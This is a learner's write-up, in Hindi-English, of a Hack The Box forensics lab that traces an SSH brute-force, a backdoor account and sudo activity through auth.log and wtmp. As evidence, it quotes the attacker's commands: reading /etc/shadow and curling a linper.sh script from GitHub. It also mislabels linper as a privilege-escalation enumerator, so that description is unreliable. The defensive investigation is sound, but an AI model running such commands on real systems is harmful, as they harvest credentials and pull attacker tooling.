# HTB Sherlock — Brutus

## 1. Overview

Brutus ek log-analysis based Sherlock hai jisme humein Linux server ke `auth.log` aur `wtmp` (login records) files analyze karke ek SSH brute-force attack ki poori story reconstruct karni thi — attacker ka IP, kaunsa account compromise hua, attacker ne manually login karke kya kiya, kaunsa naya user banaya (persistence), aur us naye user ne sudo se kya commands chalayi.

Yeh case digital forensics ka classic example hai: hume koi "hacking" nahi karni, sirf **evidence padhna aur usse sahi conclusion nikalna** hai — bilkul waise jaise ek SOC analyst ya incident responder karta hai jab breach ke baad logs check karta hai.

Is investigation me do main artifacts the:
- `auth.log` — SSH authentication aur sudo activity ka text log
- `wtmp` — binary login session record (jisse `utmp.py` naam ke Python script se parse kiya)

---

## 2. What I Learned

- Kaise `auth.log` me brute-force attempts ko find aur count karte hain
- Kaise successful login ko failed attempts se differentiate karte hain
- Kaise `wtmp`/`utmp` records se manual (interactive) session identify karte hain, kyunki auth.log akela pura context nahi deta
- **Sabse important lesson:** timestamps blindly trust nahi karne — `auth.log` aur `wtmp` alag-alag timezone show kar sakte hain, isliye epoch time ko explicitly UTC me convert karke hi compare karna chahiye
- Kaise sudo COMMAND log entries se attacker ki post-exploitation activity dekhte hain
- Kaise findings ko MITRE ATT&CK framework ke actual technique ID se map karte hain, sirf memorize nahi karte

---

## 3. Investigation Artifacts

### auth.log

Yeh Linux ka authentication log hai (`/var/log/auth.log`). Isme record hota hai:
- SSH login attempts (failed aur accepted dono)
- Session open/close events
- `sudo` command usage
- User creation jaisi privileged actions (agar `useradd` command chali ho)

Yeh text-based log hota hai, isliye `grep`, `awk` jaise tools se directly search kar sakte hain.

### wtmp

`wtmp` ek **binary file** hai jo Linux system ke login/logout history store karta hai (kaun user, kaunsi terminal/pts, kaunsa source IP, session start/end time — Unix epoch format me). Kyunki yeh binary hai, humne isse directly `cat` ya `grep` nahi kar sakte — ek parser chahiye hota hai.

### utmp.py

Yeh ek helper Python script tha jo `wtmp` binary file ko parse karke human-readable text output deta hai (username, IP, PID, session type, timestamp waghera). Humne is script ka output ek text file (`wtmp.txt`) me redirect karke usme grep kiya.

> Lesson: Jab bhi koi binary forensic artifact milta hai jo directly readable nahi hota, sabse pehle dekho ki koi parser script diya gaya hai ya nahi (jaise yaha `utmp.py`). Agar nahi diya, toh standard tools jaise `utmp-dump`, `last`, ya `python-utmp` library use kar sakte ho.

---

## 4. Important Concepts

### SSH Authentication

Jab koi remote machine se SSH karta hai, server `auth.log` me har attempt ka record likhta hai — chahe wo fail ho ya success. Failed attempt me `"Failed password"` string aati hai, aur successful attempt me `"Accepted password"` string aati hai.

### Brute Force Detection

Brute-force ka matlab hai attacker ne bahut saare passwords try kiye ek hi username (ya multiple usernames) ke against, bahut kam time me. Isko detect karne ka tareeka hai: `"Failed password"` entries ko count karke dekho ki kis IP se sabse zyada attempts aaye.

### Successful Authentication

Brute-force ke baad attacker kabhi na kabhi sahi password guess kar leta hai — tab `auth.log` me `"Accepted password"` entry milegi. Yeh wahi line hai jo batati hai attack successful kab hua aur kis account pe.

### wtmp vs auth.log

- `auth.log` batata hai **authentication events** (kab login attempt hua, kaamyab hua ya nahi, sudo use hua ya nahi)
- `wtmp` batata hai **session records** (kaunsa terminal/pts allocate hua, session kab start/end hua, epoch timestamp ke saath)

Dono ko saath me correlate karna padta hai kyunki `auth.log` yeh nahi batata ki attacker ne login ke baad kitni der terminal pe interactive kaam kiya — woh info `wtmp` se milti hai.

### Unix Epoch Time

Epoch time ek number hota hai jo batata hai ki 1 January 1970, 00:00:00 UTC se kitne seconds beet chuke hain. Yeh timezone-independent hota hai — asli meaning nikalne ke liye humein isko explicitly kisi timezone (jaise UTC) me convert karna padta hai.

### UTC vs Local Time

Yeh iss investigation ka sabse bada trap tha (detail Section 9 me).

### SSH Sessions

Har SSH login ek session banata hai jisko ek `pts/N` (pseudo-terminal number) assign hota hai. `wtmp` me yeh session number record hota hai, jo humein batata hai ki konsa login kis terminal pe hua tha — isse hum multiple logins ko distinguish kar sakte hain.

### sudo Logging

Jab koi user `sudo` se koi command run karta hai, `auth.log` me `COMMAND=` wali entry aati hai jisme exact command likha hota hai jo run hua. Yeh attacker ki post-compromise activity (kya dekha, kya download kiya) samajhne ka sabse direct evidence hai.

### Persistence

Attacker jab compromise ke baad ek naya user account bana deta hai taaki original vulnerability patch ho jaane ke baad bhi wo wapas access le sake, usse **persistence** kehte hain. Isko `auth.log` me `useradd` related entries se identify karte hain.

### MITRE ATT&CK

Ek globally-used framework jo real-world attacker behaviors ko standard "Tactics" aur "Techniques" me categorize karta hai, taaki har SOC/analyst ek common language use kare (detail Section 10 me).

---

## 5. Investigation Methodology

General workflow jo is investigation me follow hua:

```
Evidence
  → Identify attacker IP
  → Identify successful authentication
  → Identify compromised account
  → Correlate auth.log with wtmp
  → Identify manual terminal session
  → Identify persistence account
  → Identify privilege escalation
  → Identify attacker commands
  → Map behavior to MITRE ATT&CK
```

Is order ko yaad rakhna — yeh workflow future investigations ke liye reusable template hai. Har step pichle step ka output use karta hai (jaise attacker IP milne ke baad, usi IP se related saari entries search karte hain).

---

## 6. Task-by-Task Investigation

> Note: Neeche jo bhi answers diye hain wo sirf uss evidence pe based hain jo hamare paas actually available tha. Jaha exact answer evidence se directly support nahi hota, wahan clearly likha gaya hai.

### Task 1

**Question:** Attacker ne SSH brute-force attack konse IP address se kiya?

**Artifact:** `auth.log`

**Search idea:** `auth.log` me failed login attempts dhoondo aur dekho konsa IP sabse zyada repeat ho raha hai.

**Command:**
```bash
grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
```

**Command explanation:**
| Part | Meaning |
|---|---|
| `grep "Failed password" auth.log` | Sirf wo lines nikalo jisme failed login ka record hai |
| `awk '{print $(NF-3)}'` | Har line ko space se split karke, end se 4th field print karo (yahi field pe IP address hota hai `auth.log` ke standard format me) |
| `sort` | IP addresses ko alphabetically/numerically sort karo taaki same IP ek saath aa jaye |
| `uniq -c` | Consecutive duplicate lines ko count karke ek line me merge karo (`-c` = count dikhao) |
| `sort -nr` | Numeric sort, reverse order (sabse zyada count top pe aaye) |

**Evidence:** Sabse zyada `Failed password` attempts ek hi IP se aaye — `65.2.161.68`.

**Reasoning:** Brute-force attack ki nishani hoti hai bahut saare failed attempts thode time me, ek hi source se. Jo IP sabse upar aaya, wahi attacker hai.

**Answer:** `65.2.161.68`

**General lesson:** Kisi bhi brute-force investigation me pehla step hamesha yehi hota hai — failed attempts ko IP-wise count karke top offender dhoondo. Yeh technique kisi bhi service ke log (FTP, RDP, web login) pe apply hoti hai, sirf field position (`awk`) different ho sakta hai.

---

### Task 2

**Question:** Attacker ne brute-force karke aakhir me konsa account successfully compromise kiya?

**Artifact:** `auth.log`

**Search idea:** Attacker IP ko `"Accepted password"` ke saath search karo.

**Command:**
```bash
grep "65.2.161.68" auth.log | grep -E "session|Accepted|sudo|COMMAND|useradd"
```

**Command explanation:**
| Part | Meaning |
|---|---|
| `grep "65.2.161.68" auth.log` | Sirf attacker IP wali lines |
| `grep -E "session|Accepted|sudo|COMMAND|useradd"` | Extended regex (`-E`) se multiple keywords ek saath match karo (OR logic `\|`) — sirf important event types filter ho jaate hain, noise hat jaata hai |

**Evidence:** Ek `Accepted password` entry mili jisme username `root` tha, IP `65.2.161.68` se.

**Reasoning:** `"Accepted password"` line hi wo point hai jaha brute-force successful hua. Us line ka username hi compromised account hai.

**Answer:** `root`

**General lesson:** Jab tumhare paas ek known "bad" IP ho, uss IP ko pivot point bana kar `grep -E` se multiple relevant keywords ek saath search karna bahut fast aur efficient technique hai — pura log baar-baar padhne ki zaroorat nahi.

---

### Task 3

**Question:** wtmp records me attacker IP se related manual (interactive) session dhoondo — us session me kaunsa account use hua tha jisse attacker ne manually terminal access liya?

**Artifact:** `wtmp` (via `utmp.py`)

**Search idea:** `wtmp` ko parse karke attacker IP se filter karo, root account ke session dekho.

**Command:**
```bash
python3 utmp.py wtmp > wtmp.txt
grep "65.2.161.68" wtmp.txt
grep '"root"' wtmp.txt
```

**Command explanation:**
| Part | Meaning |
|---|---|
| `python3 utmp.py wtmp` | Binary `wtmp` file ko parser script se readable format me convert karo |
| `> wtmp.txt` | Output ko file me redirect karo taaki baar-baar parse na karna pade, aur usme grep kar sakein |
| `grep "65.2.161.68" wtmp.txt` | Attacker IP wale session records filter karo |
| `grep '"root"' wtmp.txt` | Root user ke session records filter karo (quotes isliye kyunki output JSON-jaisa structured tha) |

**Evidence:** `root` user ka ek session mila jo `65.2.161.68` se aaya, epoch timestamp `1709706765` ke saath.

**Reasoning:** Yeh confirm karta hai ki brute-force ke baad, root account se ek actual interactive session bhi khula — sirf ek login attempt nahi, balki attacker ne terminal access use kiya.

**Answer:** `root` (session evidence: epoch `1709706765`, source IP `65.2.161.68`)

**General lesson:** `auth.log` sirf batata hai login hua ya nahi — `wtmp` batata hai ki kya wo login ek **real interactive session** bana, jisme attacker commands chala saka. Dono ko cross-verify karna zaroori hai.

---

### Task 4

**Question:** Root session ka time (UTC me) kya tha?

**Artifact:** `wtmp` (epoch timestamp) + Python (`datetime`)

**Search idea:** Root session ka raw epoch value nikalo, phir usse explicitly UTC me convert karo (na ki local time trust karo — detail Section 9 me).

**Command:**
```bash
python3 -c 'import datetime; print(datetime.datetime.fromtimestamp(1709706765, datetime.timezone.utc))'
```

**Command explanation:**
| Part | Meaning |
|---|---|
| `python3 -c '...'` | Ek chhota inline Python command run karo (poora script file banaye bina) |
| `datetime.datetime.fromtimestamp(1709706765, ...)` | Epoch number ko date-time object me convert karo |
| `datetime.timezone.utc` | Conversion explicitly UTC timezone me karo, machine ke local timezone ko ignore karke |

**Evidence:** Output: `2024-03-06 06:32:45 UTC`

**Reasoning:** Yeh epoch → UTC conversion hi sahi timeline banane ka tareeka hai, kyunki `wtmp.py` ka default output (local time) galat impression de raha tha (Section 9 dekho).

**Answer:** Root session `2024-03-06 06:32:45 UTC` par shuru hua.

**General lesson:** Kabhi bhi raw epoch number ko "as-is" trust mat karo agar timezone clear na ho — hamesha explicit UTC conversion karo taaki cross-artifact comparison me galti na ho.

---

### Task 5

**Question:** Attacker ne persistence ke liye kaunsa naya account banaya, aur us account ka manual session kab (UTC) tha?

**Artifact:** `wtmp` + `auth.log`

**Search idea:** `wtmp` me root ke turant baad ka session dekho (dusra `pts` session), aur `auth.log` me `useradd` keyword dhoondo.

**Command:**
```bash
grep '"USER".*"pts/1"' wtmp.txt
python3 -c 'import datetime; print(datetime.datetime.fromtimestamp(1709707055, datetime.timezone.utc))'
```

**Command explanation:**
| Part | Meaning |
|---|---|
| `grep '"USER".*"pts/1"' wtmp.txt` | Un lines ko dhoondo jisme "USER" field ho aur wahi line me `pts/1` (specific terminal session) bhi ho — regex `.*` ka matlab hai "beech me kuch bhi ho sakta hai" |
| Second command | Us session ka epoch time UTC me convert karo |

**Evidence:** Naya user `cyberjunkie`, IP `65.2.161.68`, epoch `1709707055` → `2024-03-06 06:37:35 UTC`.

**Reasoning:** Root session ke turant baad ek naya user (`cyberjunkie`) ka session dikhna, yeh classic persistence pattern hai — attacker apna khud ka backdoor account bana ke usi se login karta hai taaki root password change hone pe bhi access na jaaye.

**Answer:** Persistence account = `cyberjunkie`; session time = `2024-03-06 06:37:35 UTC`.

**General lesson:** Persistence accounts ko detect karne ka signal hota hai — root/admin session ke turant baad, ek naya/unfamiliar username ka session same attacker IP se aana.

---

### Task 6

**Question:** Attacker ne privilege escalation/persistence ke through kya kya sudo commands chalayi?

**Artifact:** `auth.log`

**Search idea:** `sudo` keyword ke saath `COMMAND=` entries dhoondo.

**Command:**
```bash
grep "COMMAND" auth.log
```

**Command explanation:**
| Part | Meaning |
|---|---|
| `grep "COMMAND" auth.log` | Har wo line nikalo jisme `COMMAND=` likha ho — yeh sudo ke through execute hui commands ka exact record hota hai |

**Evidence:**
```
COMMAND=/usr/bin/cat /etc/shadow
COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

**Reasoning:**
- `cat /etc/shadow` → attacker ne sabhi system users ke password hashes padhne ki koshish ki (credential harvesting / reconnaissance)
- `curl ... linper.sh` → attacker ne ek known privilege-escalation enumeration script (LinPEAS-family) download kiya, jo system me aur privesc paths dhoondne ke liye use hota hai

**Answer:** Attacker ne `/etc/shadow` read kiya aur ek external privilege-escalation script (`linper.sh`) download kiya.

**General lesson:** `COMMAND=` grep karna kisi bhi Linux breach investigation ka sabse fast tareeka hai attacker ki **post-exploitation intent** samajhne ka — chahe woh data theft ho ya further exploitation attempt.

---

### Task 7

**Question:** Pehla SSH manual session (root ka) kab close/end hua?

**Artifact:** `auth.log`

> **Important:** Sirf `wtmp` ke timestamp se "guess" nahi karna chahiye ki session kab khatam hua — kyunki `wtmp` sirf session start/PID record karta hai, disconnect/close event `auth.log` me hota hai. Sahi tareeka hai session ke PID (process ID) ko trace karna.

**Search idea:** Pehle root session ki `Accepted password` line se uska PID (process ID number, jaise `sshd[2411]`) note karo, phir usi PID number ko puri log file me search karo taaki uska poora lifecycle (open → disconnect → closed) mil jaaye.

**Command:**
```bash
grep "2411" auth.log
```

**Command explanation:**
| Part | Meaning |
|---|---|
| `grep "2411" auth.log` | `auth.log` me har process har line pe apna PID likhta hai (jaise `sshd[2411]:`) — isi PID number ko search karke us specific session ke saare related events (login se logout tak) ek saath mil jaate hain |

**Evidence (interpretation of typical lines):**
| Line | Meaning |
|---|---|
| `Accepted password` | Login successful hua, session start |
| `session opened` | PAM (Pluggable Authentication Module) ne user ke liye session officially open kiya |
| `Received disconnect` | Client (attacker) ne apni taraf se disconnect signal bheja |
| `Disconnected from user` | Server ne confirm kiya ki user disconnect ho gaya |
| `session closed` | Session officially band ho gaya (yehi actual "session end" event hai) |

**Reasoning:** `session closed` wali line hi authoritative proof hai ki session kab khatam hua — na ki `wtmp` ka start timestamp guess karke.

**Answer:** Is investigation me humare paas jo evidence collect hua tha usme is task ke liye specific `session closed` timestamp explicitly note nahi kiya gaya tha, isliye main yaha exact answer invent nahi karunga. **Sahi method** ye hai: root session ke `Accepted password` line se PID nikaalo, us PID ko `grep` karo, aur output me jo `session closed` line milegi uska timestamp hi correct answer hai.

**General lesson:** Session ka end time kabhi bhi assumption se mat nikaalo. Hamesha PID-based tracing karo — ek process ka PID uske pure lifecycle (start se end tak) ko `auth.log` me jodta hai.

---

### Task 8

**Question:** Attacker ke overall behavior (naya account banana) ko MITRE ATT&CK framework me kaise classify karenge?

**Artifact:** Investigation findings (Task 5 + Task 6) + MITRE ATT&CK Enterprise Matrix (external reference)

**Search idea:** "Create Account" ya "Local Account" jaisa tactic/technique MITRE ke Persistence category me dhoondo.

**Command:** (koi log command nahi — yeh ek mapping/research step hai, MITRE ki website use karke)

**Command explanation:** N/A — is step me hum apni findings (naya user `cyberjunkie` banaya gaya) ko ek standardized attacker-behavior taxonomy se match karte hain.

**Evidence:** `useradd`/naya user creation evidence Task 5 se.

**Reasoning:** MITRE ATT&CK me "banaya gaya naya local user account jo future access ke liye use ho" — yeh exactly **Persistence** tactic ke andar, **Create Account** technique ke andar, **Local Account** sub-technique me aata hai.

**Answer:** `T1136.001 — Create Account: Local Account` (Tactic: Persistence)

**General lesson:** Jab bhi koi attacker koi naya user/account banata hai (local ho ya cloud/domain), woh almost hamesha "Create Account" technique ke under aayega — sirf sub-technique decide karta hai ki account kis type ka tha (Local `.001`, Domain `.002`, ya Cloud `.003`).

---

## 7. Command Cheat Sheet

| Command | Purpose | What to look for |
|---|---|---|
| `grep "Failed password" auth.log` | Saare failed SSH login attempts nikalo | Attempts ka pattern, konse users target hue |
| `grep "Failed password" auth.log \| awk '{print $(NF-3)}' \| sort \| uniq -c \| sort -nr` | Failed attempts ko IP-wise count karo, top offender dhoondo | Sabse upar wala IP = likely attacker |
| `grep "<IP>" auth.log \| grep -E "session\|Accepted\|sudo\|COMMAND\|useradd"` | Ek specific IP ki saari important activity filter karo | Accepted password, sudo usage, useradd |
| `python3 utmp.py wtmp` | Binary `wtmp` ko readable format me parse karo | Human-readable session records |
| `python3 utmp.py wtmp > wtmp.txt` | Parsed output ko file me save karo | Baar-baar grep karne ke liye ready file |
| `grep "<IP>" wtmp.txt` | wtmp me attacker IP ke sessions dhoondo | Session count, usernames |
| `grep '"root"' wtmp.txt` | Specific user (root) ke session records | Session timing, terminal (pts) |
| `grep '"USER".*"pts/1"' wtmp.txt` | Specific pts terminal pe kis user ka session tha | Persistence account identify karna |
| `date` / `date -u` / `timedatectl` | System ka current local time / UTC time / timezone config dekho | Confirm karo machine kis timezone pe set hai |
| `grep -n "datetime\|strftime\|fromtimestamp\|utcfromtimestamp" utmp.py` | Script ke andar time-conversion logic dhoondo | Kya script local time use kar raha hai ya UTC |
| `python3 -c 'import datetime; print(datetime.datetime.fromtimestamp(EPOCH, datetime.timezone.utc))'` | Epoch ko explicitly UTC me convert karo | Sahi, timezone-independent timestamp |
| `grep "COMMAND" auth.log` | Saare sudo se run hui commands nikalo | Attacker ki post-exploitation activity |
| `grep "<PID>" auth.log` | Ek specific session ka pura lifecycle trace karo | Session open se session closed tak |

---

## 8. Log Analysis Techniques Learned

- **`grep`** — kisi bhi keyword/pattern wali lines file se filter karna. Sabse basic aur sabse zyada use hone wala tool.
- **`grep -E`** — Extended regex mode, jisse `|` (OR) use karke ek saath multiple patterns match kar sakte ho.
- **`awk`** — line ko fields me todkar (default: space se) specific field print karna. Structured logs se ek column nikalne ke liye best.
- **`sort`** — data ko order me lagana, taaki duplicate values ek saath aa jaayein (uniq se pehle zaroori step).
- **`uniq -c`** — consecutive duplicate lines ko count karke ek line me combine karna.
- **`sort -nr`** — numeric, reverse order sort — highest count sabse upar.
- **Pipes `|`** — ek command ka output dusre command ka input banana, taaki chhote-chhote tools ko chain karke complex analysis kar sako.
- **Redirect `>`** — kisi command ka output file me save karna, taaki baar-baar heavy processing (jaise binary parsing) na karni pade.
- **Multiple conditions ke saath grep** — pehle ek broad filter (IP) lagao, phir usi output pe dusra filter (keyword) lagao — isse noise kam hota hai.
- **PID se search karna** — kisi process ka pura lifecycle (start to end) trace karne ka sabse reliable tareeka.
- **IP se search karna** — ek specific source ki saari activity ek jagah collect karna.
- **Username se search karna** — kisi specific account (compromised ya newly-created) ki activity isolate karna.
- **Keyword se search karna** — specific event types (`Accepted`, `Failed`, `COMMAND`, `useradd`, `session`) ko target karke bade log files me relevant lines jaldi dhoondna.

---

## 9. Timestamp Analysis

Yeh section is investigation ka sabse important lesson cover karta hai.

**Problem kya tha:**

Diya gaya `utmp.py` script originally Python ke `time.localtime()` function use kar raha tha epoch timestamps ko readable format me dikhane ke liye. Problem yeh hai ki `time.localtime()` epoch ko **machine ki apni local timezone settings** ke hisaab se convert karta hai — na ki UTC me.

Humari Kali machine ka local timezone kuch aur set tha, isliye jab humne `wtmp` ka output dekha, toh usme dikha:

```
local displayed time = 2024/03/06 12:02:45
```

Yeh time galat impression de raha tha, kyunki `auth.log` ke timestamps generally UTC (ya server ki apni timezone) me hote hain. Agar hum in dono ko directly compare karte (bina convert kiye), toh humara pura timeline galat ban jaata — events actual se ghanto aage/peeche dikhte.

**Solution:**

Har epoch timestamp ko explicitly UTC me convert karna, taaki timezone ambiguity hi na rahe:

```python
import datetime
print(datetime.datetime.fromtimestamp(EPOCH, datetime.timezone.utc))
```

**Actual Brutus example:**

| Field | Value |
|---|---|
| Root session epoch | `1709706765` |
| `time.localtime()` output (misleading) | `2024/03/06 12:02:45` |
| Correct UTC (via `fromtimestamp(..., timezone.utc)`) | `2024-03-06 06:32:45 UTC` |
| cyberjunkie session epoch | `1709707055` |
| Correct UTC | `2024-03-06 06:37:35 UTC` |

**Concept summary:**

- **Unix epoch** = ek pure number (seconds since 1 Jan 1970 UTC) — apne aap me koi timezone information nahi rakhta.
- **Local timezone** = jab tak explicitly na bataya jaaye, koi bhi system apni configured local timezone use karke epoch ko convert karega — jo har machine pe different ho sakti hai.
- **UTC** = ek universal reference timezone — forensic investigations me hamesha isi me convert karke compare karna chahiye, taaki alag-alag artifacts/machines ke timestamps directly comparable ho.
- `date`, `date -u`, aur `timedatectl` commands use karke hum verify kar sakte hain ki investigation machine kis timezone pe set hai — yeh cross-check hamesha karna chahiye jab bhi kisi naye system ke logs padh rahe ho.

---

## 10. MITRE ATT&CK Mapping

**MITRE ATT&CK kya hai:**

MITRE ATT&CK ek globally-maintained knowledge base hai jo real-world cyberattacks me use hone wale attacker behaviors ko ek **standard structure** me organize karta hai:

```
Tactic (attacker ka "why" / goal)
  └── Technique (attacker ka "how")
        └── Sub-technique (aur bhi specific "how")
```

Isse security teams duniya bhar me ek **common language** use kar paate hain jab wo attacks describe karte hain — jaise "T1136.001" bolne se har analyst ko exactly pata chal jaata hai ki kya hua tha.

**Is investigation me mapping:**

```
Persistence
└── Create Account
    └── T1136.001 — Local Account
```

**Yeh mapping kyu hui, sirf ID memorize kyu nahi karni:**

Attacker ne `root` compromise karne ke baad ek naya user `cyberjunkie` banaya. Iska **goal/intent** (Tactic) tha — future access maintain rakhna, chahe root ka password change ho jaaye ya vulnerability patch ho jaaye. Yeh exactly **Persistence** tactic ki definition hai.

Ab **method** (Technique) dekho — attacker ne ek naya account banaya (na ki koi existing account hijack kiya, na koi scheduled task use kiya) — isliye yeh "Create Account" technique hai, kisi aur persistence technique (jaise cron job) ki nahi.

Aur **specificity** (Sub-technique) — account Linux machine ka ek **local** user tha (na ki AWS IAM user, na ki Active Directory domain user) — isliye specifically `.001 (Local Account)` sub-technique lagti hai, `.002 (Domain Account)` ya `.003 (Cloud Account)` nahi.

Matlab: ID yaad karne ke bajaye, teen sawaal poocho — **Intent kya tha? Method kya tha? Specific context kya tha?** — aur ID khud-ba-khud match ho jaayegi.

**MITRE Enterprise Matrix se khud ID kaise dhoondein:**

1. `attack.mitre.org` par jaao.
2. "Enterprise Matrix" open karo — yeh saari tactics ko columns me dikhata hai (Reconnaissance, Initial Access, Persistence, Privilege Escalation, etc.).
3. Apne evidence ke hisaab se socho ki attacker ka **intent** kya tha — yahi tumhara **Tactic** column hoga (yaha: Persistence).
4. Us Tactic column ke andar niche scroll karo aur dekho konsi Technique tumhare evidence (naya account banana) se match karti hai — "Create Account" milega.
5. Us Technique pe click karo — sub-techniques ki list khulegi. Apne evidence ke exact type ke hisaab se sahi sub-technique choose karo (Local vs Domain vs Cloud Account).
6. Wahi page tumhe official Technique ID (jaise `T1136.001`) bhi dikha dega, saath me detailed description aur real-world examples.

---

## 11. What I Should Remember

- Brute-force detect karne ka fastest tareeka: `Failed password` count IP-wise karo, top IP hi attacker hai.
- `Accepted password` line hi confirm karti hai kaunsa account actually compromise hua.
- `auth.log` sirf authentication events batata hai; `wtmp` batata hai actual interactive sessions — dono ko correlate karna zaroori hai.
- Naya user account, existing compromised session ke turant baad banna, persistence ka classic signal hai.
- `sudo` ki `COMMAND=` entries attacker ki niyat (intent) samajhne ka sabse direct evidence hoti hain.
- **Kabhi bhi timestamps ko bina timezone-check kiye trust mat karo** — hamesha epoch ko explicitly UTC me convert karke compare karo.
- Session ka end-time guess se nahi, PID trace karke `auth.log` se nikaalo.
- MITRE ATT&CK mapping karte waqt "Intent → Method → Specific context" order me socho, ID memorize mat karo.
- Jab evidence kisi task ke exact answer ko support nahi karta, "guess" mat karo — clearly likho ki evidence insufficient hai aur sahi method kya hota.

---

## 12. How I Would Solve a Similar Sherlock Next Time

Ek repeatable checklist jo bina AI ke follow kar sakta hoon:

1. **Artifacts identify karo** — kaunsi files diye gaye hain (log files, binary files, memory dumps, etc.) aur har ek kis type ki information deti hai.
2. **Binary artifacts ke liye parser dhoondo** — agar file directly readable nahi hai (jaise `wtmp`), dekho koi script diya gaya hai ya standard tool available hai.
3. **Brute-force / failed attempts count karo** — `grep` + `awk` + `sort` + `uniq -c` combo se top offending IP/user dhoondo.
4. **Successful event dhoondo** — `Accepted`, `success`, ya similar keyword se confirm karo attack kab successful hua aur konse account pe.
5. **Cross-correlate artifacts** — jo attacker IP/account mila, usko doosre artifact (jaise `wtmp`) me bhi search karo taaki full picture bane.
6. **Persistence signals dhoondo** — naye accounts, naye SSH keys, naye cron jobs, naye services — jo compromise ke turant baad banaye gaye ho.
7. **Privilege escalation / command execution evidence dhoondo** — `sudo`, `COMMAND=`, ya process execution logs check karo.
8. **Timestamps ko hamesha UTC me normalize karo** — epoch values ko explicit timezone ke saath convert karo, kabhi bhi default/local time trust mat karo.
9. **Session lifecycle trace karo PID/session-ID se** — start aur end dono events dhoondo, guess mat karo.
10. **Findings ko MITRE ATT&CK se map karo** — Intent (Tactic) → Method (Technique) → Specific context (Sub-technique) order me socho.
11. **Evidence aur conclusion ko clearly separate likho** — pehle raw evidence dikhao, phir reasoning, phir final answer — taaki khud ko aur doosron ko clarity rahe ki conclusion kaha se aaya.
12. **Jahan evidence incomplete ho, wahan honestly likho** — kabhi bhi missing evidence ko guess se fill mat karo.

---

## Final Takeaway

Brutus attack ki poori kahani evidence ke basis pe kuch is tarah bani: Attacker (`65.2.161.68`) ne server ke `root` account ke against ek SSH brute-force attack chalaya — bahut saare password attempts try kiye, aur aakhir me sahi password guess karke `root` account compromise kar liya. Us login ke baad attacker ne sirf login nahi kiya, balki `wtmp` records ke hisaab se ek actual **interactive terminal session** bhi khola — matlab woh manually commands chala raha tha.

Root access milte hi attacker ne apni **persistence** secure karne ke liye ek naya local user account `cyberjunkie` bana diya, taaki agar root password change ho jaaye ya original vulnerability patch ho jaaye, tab bhi uska access bana rahe (yeh behavior MITRE ATT&CK ke `T1136.001 — Create Account: Local Account` se match karta hai). Uske baad, sudo access use karke attacker ne `/etc/shadow` file padhi (jisme system ke saare password hashes hote hain — credential harvesting ki koshish), aur ek external script (`linper.sh`, ek privilege-escalation enumeration tool) download kiya, jo dikhata hai ki attacker system me aur deeper access paane ki koshish kar raha tha.

Investigation ke through humne yeh pura timeline sirf logs padh kar, evidence ko carefully correlate karke, aur timestamps ko sahi tareeke se (UTC me) convert karke reconstruct kiya — bina kisi assumption ke, sirf uss evidence ke basis par jo actually files me maujood tha.
